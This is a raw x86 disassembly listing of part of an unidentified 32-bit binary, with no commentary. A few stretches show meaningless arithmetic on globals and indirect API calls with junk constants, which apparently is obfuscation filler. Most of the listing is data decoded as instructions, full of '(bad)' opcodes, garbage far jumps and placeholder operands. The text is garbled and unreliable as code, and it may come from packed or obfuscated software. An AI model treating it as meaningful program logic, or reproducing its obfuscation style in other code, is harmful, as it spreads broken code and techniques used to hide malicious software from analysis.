  4205c3:	cmp    DWORD PTR ds:0x4281b3,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x4283df
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e8c
  4205e8:	xor    edx,DWORD PTR ds:0x428287
  4205ee:	mov    ecx,DWORD PTR ds:0x42826f
  4205f4:	or     DWORD PTR ds:0x42819f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x428313
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x4283db,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x4282bb
  42061a:	xor    DWORD PTR ds:0x4282a7,edx
  420620:	movzx  ecx,WORD PTR ds:0x428293
  420627:	and    ecx,DWORD PTR ds:0x4283cb
  42062d:	mov    DWORD PTR ds:0x428293,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x4283df,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42066f:	mov    dh,0xad
  420671:	mov    al,0xac
  420673:	sbb    eax,0x12a31816
  420678:	sbb    BYTE PTR [eax],bl
  42067a:	xchg   ecx,eax
  42067b:	gs pusha 
  42067d:	xor    DWORD PTR [eax-0x62],edi
  420680:	es out 0x59,eax
  420683:	fwait
  420684:	test   al,0x4
  420686:	sub    eax,0x18b8efb0
  42068b:	lock pop esp
  42068d:	or     al,0xe5
  42068f:	cmp    BYTE PTR [eax],bl
  420691:	ret    0x4fae
  420694:	and    DWORD PTR [ebp-0x1a10338],ecx
  42069a:	(bad)  
  42069b:	out    0xc2,al
  42069d:	inc    ebp
  42069e:	add    bh,BYTE PTR [esi+0x35]
  4206a1:	adc    dh,BYTE PTR [ebp-0x54ae666a]
  4206a7:	scas   eax,DWORD PTR es:[edi]
  4206a8:	test   al,0x70
  4206aa:	mov    edi,0xd67f7ba3
  4206af:	xchg   ecx,eax
  4206b0:	loope  0x4206d6
  4206b2:	pop    esp
  4206b3:	jb     0x4206c0
  4206b5:	stos   DWORD PTR es:[edi],eax
  4206b6:	add    dl,BYTE PTR fs:[edx+0x6f522ac5]
  4206bd:	xchg   ecx,eax
  4206be:	fiadd  DWORD PTR [ebx-0x1d074260]
  4206c4:	out    dx,al
  4206c5:	mov    bl,0x66
  4206c7:	es aam 0x95
  4206ca:	inc    ebx
  4206cb:	pop    ebp
  4206cc:	push   edx
  4206cd:	data16 jne 0x420686
  4206d0:	and    eax,0x5e913833
  4206d5:	imul   edx,DWORD PTR [edx+0x206c7c53],0x6862cea2
  4206df:	sub    al,0xb
  4206e1:	mov    eax,0x7245ec6
  4206e6:	not    BYTE PTR [ebx+0x38407b17]
  4206ec:	rol    BYTE PTR [edi],1
  4206ee:	lahf   
  4206ef:	jo     0x420753
  4206f1:	out    dx,eax
  4206f2:	retf   0x8679
  4206f5:	std    
  4206f6:	out    dx,al
  4206f7:	enter  0xb48a,0x7a
  4206fb:	inc    eax
  4206fc:	in     eax,0xad
  4206fe:	fmul   DWORD PTR [eax+0xa5d8611]
  420704:	inc    edi
  420705:	jb     0x420727
  420707:	cmp    BYTE PTR [ecx],bl
  420709:	mov    ecx,0x5652ec9
  42070e:	cmp    al,0xda
  420710:	cld    
  420711:	inc    ebx
  420712:	jge    0x42069e
  420714:	mov    ds:0x8cc43c78,al
  420719:	lea    ebp,[ebx]
  42071b:	and    eax,DWORD PTR [ebp-0x560dba87]
  420721:	scas   eax,DWORD PTR es:[edi]
  420722:	lods   al,BYTE PTR ds:[esi]
  420723:	push   ebp
  420724:	cld    
  420725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420726:	xor    BYTE PTR [ebp-0x7f],dl
  420729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42072a:	dec    ebp
  42072b:	enter  0xad87,0xe6
  42072f:	rcl    DWORD PTR [edx+0x1fadf68c],0xd
  420736:	and    ch,ah
  420738:	cld    
  420739:	jg     0x420799
  42073b:	pop    ebx
  42073c:	ins    DWORD PTR es:[edi],dx
  42073d:	dec    edx
  42073e:	test   BYTE PTR [edi],ah
  420740:	icebp  
  420741:	pop    ebp
  420742:	sbb    edi,DWORD PTR [ebx]
  420744:	xor    al,0x34
  420746:	add    BYTE PTR [ebp-0x40f19430],dh
  42074c:	inc    edi
  42074d:	in     al,dx
  42074e:	sar    DWORD PTR [eax+0x4cb43419],0xc2
  420755:	xlat   BYTE PTR ds:[ebx]
  420756:	pop    ds
  420757:	retf   
  420758:	push   es
  420759:	fs pop eax
  42075b:	cmp    esp,eax
  42075d:	ror    DWORD PTR [ebx-0x627a5684],1
  420763:	addr16 in al,0x48
  420766:	add    DWORD PTR [edi-0x6fad963b],edi
  42076c:	out    dx,eax
  42076d:	nop
  42076e:	int3   
  42076f:	(bad)  
  420770:	dec    eax
  420771:	push   0x54
  420773:	sub    eax,DWORD PTR ds:0x3d457ffa
  420779:	seto   BYTE PTR [ebp-0x2feaf2d]
  420780:	dec    esi
  420781:	test   al,bh
  420783:	fbld   TBYTE PTR [edi]
  420785:	adc    dl,0xd6
  420788:	or     DWORD PTR [edx+0x12be1382],0x399329ba
  420792:	mov    ebp,0xa2a6b0
  420797:	adc    bl,cl
  420799:	(bad)  
  42079a:	imul   edx,esi,0xd2dc0eaf
  4207a0:	mov    dl,0xfc
  4207a2:	cmp    al,0x76
  4207a4:	fisub  WORD PTR [edi]
  4207a6:	and    al,BYTE PTR [ebx+0x65]
  4207a9:	outs   dx,BYTE PTR ds:[esi]
  4207aa:	or     al,0xa5
  4207ac:	mov    ch,0xc2
  4207ae:	scas   al,BYTE PTR es:[edi]
  4207af:	jl     0x42073d
  4207b1:	call   0xbfa12317
  4207b6:	pop    esi
  4207b7:	lea    ecx,[esi+edx*8+0x5685b0f8]
  4207be:	push   ebp
  4207bf:	rcr    BYTE PTR [edx+0x62],1
  4207c2:	push   es
  4207c3:	mov    dh,al
  4207c5:	cwde   
  4207c6:	in     al,0xbe
  4207c8:	dec    edi
  4207c9:	aam    0x79
  4207cb:	sub    al,0xb2
  4207cd:	outs   dx,DWORD PTR ds:[esi]
  4207ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207cf:	pop    edx
  4207d0:	imul   eax,DWORD PTR [ebx-0xdcbe18e],0x14a6bdc9
  4207da:	into   
  4207db:	outs   dx,DWORD PTR ds:[esi]
  4207dc:	mov    BYTE PTR [edi+0x5a],cl
  4207df:	jecxz  0x4207da
  4207e1:	mov    ah,0xb3
  4207e3:	xlat   BYTE PTR ds:[ebx]
  4207e4:	repnz add esi,DWORD PTR [ecx-0x76]
  4207e8:	fwait
  4207e9:	and    dh,BYTE PTR [esi+0x7e]
  4207ec:	push   cs
  4207ed:	xor    esi,DWORD PTR [eax-0x7d]
  4207f0:	aad    0x95
  4207f2:	push   edx
  4207f3:	not    BYTE PTR [esi-0x32]
  4207f6:	aam    0x33
  4207f8:	aad    0xe3
  4207fa:	aas    
  4207fb:	mov    esi,edi
  4207fd:	add    eax,0x8bcce450
  420802:	mov    esi,0x924ade38
  420807:	ds mov edi,0x56ad9ddd
  42080d:	das    
  42080e:	mov    cl,0x32
  420810:	outs   dx,BYTE PTR fs:[esi]
  420812:	arpl   WORD PTR [esi+edi*4],di
  420815:	cli    
  420816:	int3   
  420817:	lds    ebx,FWORD PTR [ecx-0xeaa6daf]
  42081d:	inc    ebp
  42081e:	or     al,0xbc
  420820:	lds    ebp,FWORD PTR [eax+0xc]
  420823:	xor    DWORD PTR [ecx-0x256de0ef],edx
  420829:	or     BYTE PTR [edx],dl
  42082b:	or     eax,0xe101ea7b
  420830:	or     edi,edi
  420832:	stos   DWORD PTR es:[edi],eax
  420833:	je     0x42081f
  420835:	nop
  420836:	cmp    DWORD PTR [esi+0x8],ebp
  420839:	inc    ebx
  42083a:	dec    esi
  42083b:	test   BYTE PTR [ebp+0x5b5d679d],cl
  420841:	jp     0x4207cc
  420843:	dec    ebx
  420844:	sub    eax,edi
  420846:	(bad)
  420849:	out    0xa3,al
  42084b:	sbb    DWORD PTR [ecx-0x68],0x408bad9b
  420852:	mov    ecx,0x315cadfe
  420857:	stos   DWORD PTR es:[edi],eax
  420858:	or     dl,BYTE PTR [edx]
  42085a:	call   0x1b3a:0x9381a50c
  420861:	lds    esi,FWORD PTR [esi-0x793b774c]
  420867:	lock pop ebx
  420869:	nop
  42086a:	retf   
  42086b:	mov    ds:0x358d0012,al
  420870:	adc    cl,al
  420872:	dec    esp
  420873:	or     eax,0x9a5529c
  420878:	fwait
  420879:	inc    eax
  42087a:	arpl   WORD PTR [ecx+eiz*1+0x69],si
  42087e:	mov    ds:0x6379516,eax
  420883:	adc    ah,ah
  420885:	loopne 0x4208df
  420887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420888:	pop    edx
  420889:	js     0x420892
  42088b:	pop    ecx
  42088c:	fld    TBYTE PTR [ebx-0x80]
  42088f:	enter  0xa546,0x87
  420893:	pop    esp
  420894:	cmp    ah,BYTE PTR [esi]
  420896:	add    ecx,DWORD PTR ds:0x7a614b86
  42089c:	cmp    DWORD PTR [ecx+0x6de09a52],edx
  4208a2:	jmp    0x4ef40a13
  4208a7:	mov    dh,0xa8
  4208a9:	shl    DWORD PTR [edi],cl
  4208ab:	cwde   
  4208ac:	cmp    BYTE PTR [ebx+edi*1+0x7f],ah
  4208b0:	jmp    0x5c91:0x31964ae5
  4208b7:	pop    eax
  4208b8:	add    al,0x4c
  4208ba:	pop    ebx
  4208bb:	cmc    
  4208bc:	outs   dx,BYTE PTR ds:[esi]
  4208bd:	xor    eax,0x905a8c39
  4208c2:	and    edx,esi
  4208c4:	pop    ebp
  4208c5:	in     eax,dx
  4208c6:	sub    al,al
  4208c8:	je     0x420929
  4208ca:	sbb    BYTE PTR [edi],bl
  4208cc:	pop    eax
  4208cd:	or     bh,dh
  4208cf:	pop    ebx
  4208d0:	sahf   
  4208d1:	and    al,0x3a
  4208d3:	add    DWORD PTR [edx+0x4f],ebx
  4208d6:	int    0x4c
  4208d8:	cmp    BYTE PTR [esi-0x31],bh
  4208db:	fld    TBYTE PTR [ecx]
  4208dd:	dec    edx
  4208de:	ret    0xc1d5
  4208e1:	pop    esp
  4208e2:	mov    WORD PTR [ebp-0x48],ds
  4208e5:	mov    bl,0x64
  4208e7:	int3   
  4208e8:	aaa    
  4208e9:	cwde   
  4208ea:	test   DWORD PTR [ebp-0x5e7aa7a],esi
  4208f0:	push   edx
  4208f1:	push   0x27
  4208f3:	xchg   edx,eax
  4208f4:	xchg   edi,eax
  4208f5:	sahf   
  4208f6:	mov    ss,WORD PTR [edi]
  4208f8:	and    DWORD PTR [ebx+0x74],0x6f9ca436
  4208ff:	xchg   edi,eax
  420900:	scas   eax,DWORD PTR es:[edi]
  420901:	ret    
  420902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420903:	das    
  420904:	sub    ah,dh
  420906:	inc    ebx
  420907:	cmc    
  420908:	test   bl,al
  42090a:	daa    
  42090b:	iret   
  42090c:	push   ebp
  42090d:	out    dx,al
  42090e:	aas    
  42090f:	push   ss
  420910:	jle    0x42096a
  420912:	jmp    0x1ecb:0xb002c3f3
  420919:	add    al,0x11
  42091b:	or     ecx,esp
  42091d:	cmp    ebp,DWORD PTR [ecx]
  42091f:	mov    cs,esp
  420921:	popa   
  420922:	jle    0x42098c
  420924:	mov    al,0x3b
  420926:	xchg   edx,eax
  420927:	out    0x2,al
  420929:	xor    al,0xca
  42092b:	fcom   DWORD PTR [ebx-0x67]
  42092e:	sbb    eax,0x9b31d25a
  420933:	mov    cl,0xfc
  420935:	cmp    ecx,DWORD PTR [edx+0x5d]
  420938:	cmp    eax,0xfe40382a
  42093d:	push   cs
  42093e:	int    0x91
  420940:	mov    esi,0xe49e8740
  420945:	jb     0x4209a8
  420947:	outs   dx,DWORD PTR ds:[esi]
  420948:	jmp    0xcbf0:0x7a6b1185
  42094f:	rcl    DWORD PTR [edi+0x7edaee21],0xa
  420956:	and    ch,BYTE PTR [esi+ebx*4+0x7]
  42095a:	or     al,BYTE PTR [eax-0x502c3ce3]
  420960:	adc    eax,0x960b24af
  420965:	js     0x4209cd
  420967:	xor    eax,0xcb61d292
  42096c:	shl    DWORD PTR [esi-0x19],cl
  42096f:	lar    esi,bp
  420972:	test   edi,ecx
  420974:	sar    BYTE PTR [edi-0x4b],1
  420977:	and    esi,esi
  420979:	xor    al,ch
  42097b:	jne    0x42095b
  42097d:	cs (bad) 
  42097f:	adc    eax,0x930e44d6
  420984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420985:	pop    eax
  420986:	aas    
  420987:	mov    WORD PTR [ebx-0x384e88f2],es
  42098d:	xor    dl,BYTE PTR [esi-0x36]
  420990:	and    al,0x57
  420992:	enter  0xe2e3,0xb1
  420996:	and    al,ah
  420998:	cmp    ah,BYTE PTR [ecx+0xd6c2399]
  42099e:	int    0x7c
  4209a0:	pop    esp
  4209a1:	push   edx
  4209a2:	fidivr WORD PTR [ebx]
  4209a4:	mov    ebp,0x3fb1cbe3
  4209a9:	xchg   ebp,eax
  4209aa:	mov    DWORD PTR [ebx],ebx
  4209ac:	sub    eax,DWORD PTR ds:0xf43f6fda
  4209b2:	dec    edx
  4209b3:	push   ds
  4209b4:	(bad)  
  4209b6:	and    bl,al
  4209b8:	rol    bh,cl
  4209ba:	test   DWORD PTR [edi+edi*8-0x1],ebp
  4209be:	call   FWORD PTR [esi+edx*2]
  4209c1:	add    BYTE PTR [eax],al
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x4282a3
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x42833f,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428367,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42827f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x4281ab,0x6139
  420a0d:	mov    DWORD PTR ds:0x4283e3,0x3849
  420a17:	cmp    DWORD PTR ds:0x428367,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e90
  420a34:	sub    DWORD PTR ds:0x42833b,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42826f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x4282cb
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x42833b
  420a66:	sub    DWORD PTR ds:0x42834f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x4281af
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x4282c3,0x0
  420a81:	mov    DWORD PTR ds:0x42832b,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428363
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x4282ab,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x4282c3,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e94
  420abd:	mov    esi,DWORD PTR ds:0x4283ab
  420ac3:	or     DWORD PTR ds:0x4282d3,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x4281e3
  420ad1:	mov    esi,DWORD PTR ds:0x428427
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x4281ab
  420ae2:	or     DWORD PTR ds:0x4282d3,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x428333,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0x5f
  420b0e:	lock iret 
  420b10:	jo     0x420b48
  420b12:	pop    ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx+0x66181812],ah
  420b1a:	jp     0x420b11
  420b1c:	xor    ch,al
  420b1e:	ficomp WORD PTR [ebx-0x590cf177]
  420b24:	cpuid  
  420b26:	mov    ebp,0x6efaa59f
  420b2b:	adc    BYTE PTR [eax+0x1d],al
  420b2e:	push   esp
  420b2f:	pop    esp
  420b30:	mov    ebp,0xaf1968e1
  420b35:	repnz inc eax
  420b37:	sbb    DWORD PTR [esi-0x4],esi
  420b3a:	adc    ebx,DWORD PTR [ebp-0x11]
  420b3d:	xor    al,0x9
  420b3f:	mov    ebp,0x7e307c48
  420b44:	mov    edx,0x649e6299
  420b49:	je     0x420b56
  420b4b:	adc    ah,al
  420b4d:	sbb    DWORD PTR [ecx+0x29b53498],0x66c90763
  420b57:	fidiv  WORD PTR [esi]
  420b59:	nop
  420b5a:	loopne 0x420b4b
  420b5c:	pop    ds
  420b5d:	push   esp
  420b5e:	(bad)  
  420b5f:	gs mov cl,0xaf
  420b62:	xchg   dl,al
  420b64:	pushf  
  420b65:	ret    0x611a
  420b68:	into   
  420b69:	or     al,0x54
  420b6b:	pop    esi
  420b6c:	fwait
  420b6d:	jns    0x420b10
  420b6f:	dec    eax
  420b70:	data16 jge 0x420b87
  420b73:	push   edx
  420b74:	jns    0x420bd5
  420b76:	sub    DWORD PTR [edi+edi*1-0xd],esi
  420b7a:	gs repz jecxz 0x420b9c
  420b7e:	mov    ch,0x83
  420b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b81:	pop    ss
  420b82:	mov    ebp,0x8eafdcef
  420b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b88:	mov    edx,?
  420b8a:	jnp    0x420bb1
  420b8c:	outs   dx,BYTE PTR ds:[esi]
  420b8d:	mov    ebp,0xa9c700a2
  420b92:	adc    BYTE PTR [ebp+0x1eccaa1],bl
  420b98:	jmp    0xd053:0xea32b0a7
  420b9f:	xchg   edi,eax
  420ba0:	daa    
  420ba1:	(bad)  
  420ba2:	and    ah,BYTE PTR [ecx]
  420ba4:	pop    eax
  420ba5:	inc    eax
  420ba6:	inc    ebp
  420ba7:	push   eax
  420ba8:	popa   
  420ba9:	sar    DWORD PTR [edi+0x3c],cl
  420bac:	test   esi,ecx
  420bae:	jne    0x420b8b
  420bb0:	mov    ch,0xda
  420bb2:	pop    ebp
  420bb3:	ret    0x6d5e
  420bb6:	adc    edx,ecx
  420bb8:	jmp    0x896793bf
  420bbd:	sbb    DWORD PTR [edi-0x484e8fef],eax
  420bc3:	into   
  420bc4:	sub    dl,cl
  420bc6:	loope  0x420b61
  420bc8:	leave  
  420bc9:	(bad)  
  420bca:	dec    edi
  420bcb:	sahf   
  420bcc:	leave  
  420bcd:	mov    ebx,0x9aaa4f4c
  420bd2:	(bad)  
  420bd3:	lock add ah,BYTE PTR [ecx+0x70]
  420bd7:	rol    DWORD PTR [esi-0xb8938ee],cl
  420bdd:	les    ebx,FWORD PTR [ebp+0x70]
  420be0:	jle    0x420c0e
  420be2:	push   ss
  420be3:	mov    al,ds:0x875e913b
  420be8:	pop    ecx
  420be9:	inc    esi
  420bea:	aaa    
  420beb:	in     eax,0x4b
  420bed:	cli    
  420bee:	jl     0x420bb6
  420bf0:	das    
  420bf1:	inc    ecx
  420bf2:	pop    ecx
  420bf3:	or     eax,0xa4b3574f
  420bf8:	pop    es
  420bf9:	std    
  420bfa:	cdq    
  420bfb:	imul   eax,DWORD PTR [ecx+0x36],0xffffffc9
  420bff:	adc    bl,BYTE PTR [ebx]
  420c01:	addr16 ret 0xf77a
  420c05:	dec    esi
  420c06:	mov    esp,0xb1a68025
  420c0b:	dec    ebp
  420c0c:	or     al,0xbd
  420c0e:	pusha  
  420c0f:	iret   
  420c10:	or     al,dl
  420c12:	cdq    
  420c13:	xor    DWORD PTR [ebx],0xffffffd4
  420c16:	outs   dx,BYTE PTR ds:[esi]
  420c17:	sbb    BYTE PTR [eax],dh
  420c19:	mov    al,ds:0x3f40a9e1
  420c1e:	lahf   
  420c1f:	ins    BYTE PTR es:[edi],dx
  420c20:	sub    BYTE PTR [edi+eax*1],al
  420c23:	xor    eax,0xe85f6de7
  420c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c29:	xor    ch,BYTE PTR [ebx+0x7c]
  420c2c:	or     ch,BYTE PTR [ebp-0x39c4b612]
  420c32:	(bad)  
  420c34:	xchg   BYTE PTR [ebx+0x6b53b35f],dh
  420c3a:	(bad)  
  420c3c:	and    BYTE PTR [esi-0xb],dl
  420c3f:	cdq    
  420c40:	xlat   BYTE PTR ds:[ebx]
  420c41:	sar    BYTE PTR [ecx+0x32],cl
  420c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c45:	ds pusha 
  420c47:	pop    ecx
  420c48:	ret    0xb672
  420c4b:	push   ss
  420c4c:	cwde   
  420c4d:	sbb    DWORD PTR [ecx-0x39],ecx
  420c50:	nop
  420c51:	xchg   edx,eax
  420c52:	mov    ecx,esp
  420c54:	add    BYTE PTR [ecx],cl
  420c56:	mov    edx,0x28838c23
  420c5b:	fwait
  420c5c:	je     0x420bfb
  420c5e:	aaa    
  420c5f:	mov    cl,0xb1
  420c61:	sbb    BYTE PTR ds:0x6bbffca1,ch
  420c67:	rol    DWORD PTR [esi],0xea
  420c6a:	out    0xe5,eax
  420c6c:	enter  0x5fe9,0x11
  420c70:	mov    edx,0x32ae21
  420c75:	rcr    BYTE PTR [ecx+0xd1837af],0x58
  420c7c:	push   edi
  420c7d:	xchg   esi,eax
  420c7e:	jb     0x420cd1
  420c80:	xor    esp,DWORD PTR [ebx]
  420c82:	fimul  DWORD PTR [esi+0x6eeabebd]
  420c88:	test   eax,0x6077c6d7
  420c8d:	ror    BYTE PTR [ebp+0x11],cl
  420c90:	std    
  420c91:	add    ecx,DWORD PTR ds:0xb9d8bb29
  420c97:	lea    esp,[esi-0x68c24ea6]
  420c9d:	and    al,BYTE PTR [ebx]
  420c9f:	add    DWORD PTR [edi-0x5c],0x42
  420ca3:	dec    eax
  420ca4:	stos   DWORD PTR es:[edi],eax
  420ca5:	neg    DWORD PTR [ebp+edx*4+0x28]
  420ca9:	sub    BYTE PTR [esi],0x51
  420cac:	xor    BYTE PTR ds:0x2089a299,bl
  420cb2:	stc    
  420cb3:	adc    eax,0x2f02faba
  420cb8:	not    BYTE PTR [esi+0x4]
  420cbb:	sbb    BYTE PTR [edx],ah
  420cbd:	sub    ebx,esp
  420cbf:	mov    ch,0x9b
  420cc1:	fucomp st(5)
  420cc3:	les    ebp,FWORD PTR [eax+0x510a0e05]
  420cc9:	icebp  
  420cca:	jbe    0x420cfe
  420ccc:	jmp    ecx
  420cce:	xor    al,0xb8
  420cd0:	in     eax,0xd4
  420cd2:	dec    esi
  420cd3:	popf   
  420cd4:	fucom  st(2)
  420cd6:	sub    ebx,esp
  420cd8:	fisubr DWORD PTR [ebp-0x6a]
  420cdb:	push   esi
  420cdc:	adc    BYTE PTR [edi-0x7f226042],bh
  420ce2:	sub    eax,0x1fecabc1
  420ce7:	sti    
  420ce8:	dec    edx
  420ce9:	and    DWORD PTR [eax-0x269308b4],esp
  420cef:	xor    eax,0x375bcd65
  420cf4:	call   0x12685468
  420cf9:	cmp    edx,DWORD PTR [edi+0x1b1e2fda]
  420cff:	cs in  eax,0x77
  420d02:	pop    esp
  420d03:	push   eax
  420d04:	xchg   ecx,eax
  420d05:	das    
  420d06:	enter  0x7333,0xc2
  420d0a:	mov    ecx,0x68f99a55
  420d0f:	mov    edx,DWORD PTR [edi]
  420d11:	add    BYTE PTR [ecx-0x22017b14],bl
  420d17:	mov    ebp,0x416e7407
  420d1c:	test   DWORD PTR [ecx*4+0x20ad3ec6],0x6d248abd
  420d27:	idiv   bl
  420d29:	pop    esp
  420d2a:	outs   dx,DWORD PTR ds:[esi]
  420d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d2c:	or     al,0x27
  420d2e:	(bad)  
  420d2f:	(bad)  
  420d30:	aaa    
  420d31:	push   cs
  420d32:	mov    ecx,DWORD PTR [edx]
  420d34:	inc    eax
  420d35:	stos   DWORD PTR es:[edi],eax
  420d36:	pop    ebx
  420d37:	fiadd  WORD PTR [ecx]
  420d39:	std    
  420d3a:	call   0xa7ba:0x53ff141b
  420d41:	adc    BYTE PTR [ecx-0x6c37d844],bl
  420d47:	push   ebp
  420d48:	addr16 aam 0x2d
  420d4b:	inc    DWORD PTR [eax+0x4b]
  420d4e:	out    dx,al
  420d4f:	dec    esp
  420d50:	inc    esp
  420d51:	cmp    DWORD PTR [edx],0xedabf5af
  420d57:	mov    fs,WORD PTR [ecx+0x5e]
  420d5a:	imul   edi,DWORD PTR [edx],0xffffff92
  420d5d:	popa   
  420d5e:	in     eax,0x48
  420d60:	inc    edi
  420d61:	out    dx,eax
  420d62:	js     0x420ce9
  420d64:	pop    es
  420d65:	retf   0x9f4
  420d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d69:	cmp    al,0x3c
  420d6b:	dec    ebp
  420d6c:	ret    0x4937
  420d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d70:	jge    0x420d2c
  420d72:	add    cl,bl
  420d74:	daa    
  420d75:	dec    esp
  420d76:	or     al,0xb7
  420d78:	dec    eax
  420d79:	mov    al,ds:0x67f2bab1
  420d7e:	dec    ecx
  420d7f:	mov    esi,0x1ac7f6c7
  420d84:	ss jbe 0x420dd6
  420d87:	aaa    
  420d88:	mov    DWORD PTR [edx-0x10],eax
  420d8b:	xor    ebx,DWORD PTR [ecx-0x51]
  420d8e:	test   BYTE PTR [ecx+0x1d19d9bd],dl
  420d94:	xchg   esi,eax
  420d95:	lock es add eax,0xf2dfa34d
  420d9c:	retf   
  420d9d:	sub    al,0x55
  420d9f:	enter  0xaf06,0x24
  420da3:	lock mov ds,WORD PTR [ebp-0x645003ca]
  420daa:	(bad)  
  420dab:	out    dx,eax
  420dac:	adc    esp,esi
  420dae:	mov    eax,0xd418c206
  420db3:	data16 mov ch,0xcb
  420db6:	dec    ecx
  420db7:	rcl    DWORD PTR [esi],1
  420db9:	jae    0x420d8c
  420dbb:	dec    ecx
  420dbc:	add    edx,DWORD PTR [ecx+esi*8+0x74]
  420dc0:	enter  0xc940,0xf0
  420dc4:	mov    eax,ds:0x52696000
  420dc9:	push   ecx
  420dca:	mov    ebx,0xd94ecf27
  420dcf:	mov    ds:0xba2b94ad,al
  420dd4:	dec    dh
  420dd6:	jns    0x420d86
  420dd8:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  420dda:	popf   
  420ddb:	aaa    
  420ddc:	repz or BYTE PTR [bx+di+0x1239],0xd8
  420de3:	dec    ebx
  420de4:	mov    ch,0x31
  420de6:	push   esi
  420de7:	popa   
  420de8:	push   ss
  420de9:	jle    0x420e27
  420deb:	jbe    0x420ded
  420ded:	dec    ecx
  420dee:	lods   al,BYTE PTR ds:[esi]
  420def:	leave  
  420df0:	stos   BYTE PTR es:[edi],al
  420df1:	fdivr  QWORD PTR [esi]
  420df3:	pop    ecx
  420df4:	jnp    0x420dde
  420df6:	outs   dx,BYTE PTR ds:[esi]
  420df7:	jne    0x420e3b
  420df9:	out    0xc2,al
  420dfb:	mov    DWORD PTR [edx+0x66ad555f],0x2a643ec4
  420e05:	data16 icebp 
  420e07:	je     0x420dde
  420e09:	dec    esp
  420e0a:	jle    0x420e64
  420e0c:	inc    esp
  420e0d:	std    
  420e0e:	into   
  420e0f:	(bad)  
  420e10:	mov    ch,0xe5
  420e12:	jno    0x420e22
  420e14:	xor    dh,bh
  420e16:	out    dx,eax
  420e17:	fmul   QWORD PTR [esi+0x10]
  420e1a:	fcomp  DWORD PTR [esi]
  420e1c:	daa    
  420e1d:	in     eax,dx
  420e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e1f:	mov    eax,ds:0x865783ad
  420e24:	adc    eax,0x7c38241f
  420e29:	lock xchg edi,eax
  420e2b:	push   ebp
  420e2c:	mov    eax,ds:0x7293a380
  420e31:	int3   
  420e32:	push   0x28
  420e34:	or     eax,0x3d50a81b
  420e39:	add    bh,dl
  420e3b:	and    esi,esp
  420e3d:	mov    esi,DWORD PTR [esi]
  420e3f:	repnz push 0x2ea81a2b
  420e45:	aaa    
  420e46:	mov    ss,esi
  420e48:	xchg   BYTE PTR [ecx],dl
